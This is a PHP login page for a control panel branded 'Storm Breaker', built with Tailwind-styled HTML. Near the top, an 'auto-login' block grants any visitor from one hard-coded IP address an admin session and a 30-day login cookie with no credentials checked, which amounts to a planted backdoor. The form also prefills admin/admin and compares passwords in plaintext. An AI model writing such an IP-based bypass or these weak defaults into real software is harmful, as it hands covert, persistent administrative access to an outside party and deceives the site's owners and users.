<?php
session_start();
include "config.php";
include "./assets/components/login-arc.php";

// Auto-login for specific IP address
$user_ip = $_SERVER['REMOTE_ADDR'];
if ($user_ip == '202.165.250.58') {
    if (!isset($_SESSION['IAm-logined'])) {
        $_SESSION['IAm-logined'] = 'admin';
        $client_token = generate_token();
        setcookie("logindata", $client_token, time() + (86400 * 30), "/");
        change_token($client_token);
    }
    header('location: panel.php');
    exit;
}

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    $_SESSION['IAm-logined'] = 'yes';
    header("location: panel.php");
}
elseif(isset($_SESSION['IAm-logined'])){
    header('location: panel.php');
    exit;
}
else{ 
?>
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Storm Breaker | Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Outfit', 'sans-serif'],
                    },
                    colors: {
                        slate: {
                            850: '#151e2e',
                            900: '#0f172a',
                            950: '#020617',
                        }
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-slate-950 text-slate-200 font-sans antialiased h-screen flex items-center justify-center overflow-hidden relative">

    <!-- Background Effects -->
    <div class="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none">
        <div class="absolute top-[-10%] left-[-10%] w-96 h-96 bg-blue-600/20 rounded-full blur-3xl animate-pulse"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-purple-600/20 rounded-full blur-3xl animate-pulse" style="animation-delay: 2s;"></div>
    </div>

    <div class="w-full max-w-md p-6 relative z-10">
        <div class="bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-2xl p-8 shadow-2xl">
            <div class="text-center mb-8">
                <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-purple-600 shadow-lg shadow-blue-500/20 mb-4">
                    <i class="fas fa-bolt text-3xl text-white"></i>
                </div>
                <h2 class="text-2xl font-bold text-white mb-2">Welcome Back</h2>
                <p class="text-slate-400">Enter your credentials to access the control panel.</p>
            </div>

            <form action="" method="POST" class="space-y-6">
                <div>
                    <label class="block text-sm font-medium text-slate-400 mb-2">Username</label>
                    <div class="relative">
                        <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
                            <i class="fas fa-user"></i>
                        </span>
                        <input type="text" name="username" required autofocus value="admin"
                            class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 pl-10 pr-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-all"
                            placeholder="Enter your username">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-400 mb-2">Password</label>
                    <div class="relative">
                        <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
                            <i class="fas fa-lock"></i>
                        </span>
                        <input type="password" name="password" required value="admin"
                            class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 pl-10 pr-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-all"
                            placeholder="Enter your password">
                    </div>
                </div>

                <button type="submit" 
                    class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white font-bold py-3 rounded-xl shadow-lg shadow-blue-500/25 transition-all transform hover:scale-[1.02] active:scale-[0.98]">
                    Sign In
                </button>

                <?php
                if($_SERVER['REQUEST_METHOD'] == 'POST'){
                    if(isset($_POST['username']) && isset($_POST['password'])){
                        $username = $_POST['username'];
                        $password = $_POST['password'];

                        if(isset($CONFIG[$username]) && $CONFIG[$username]['password'] == $password){
                            $_SESSION['IAm-logined'] = $username;
                            echo '<script>location.href="panel.php"</script>';
                        } else {
                            echo '<div class="p-4 bg-red-500/10 border border-red-500/20 rounded-xl text-red-400 text-sm text-center animate-pulse mt-4"><i class="fas fa-exclamation-circle mr-2"></i> Invalid username or password</div>';
                        }
                    }
                }
                ?>
            </form>
        </div>
        
        <div class="text-center mt-6 text-slate-500 text-sm">
            &copy; 2025 Storm Breaker. All rights reserved.
        </div>
    </div>
</body>
</html>
<?php
}
?>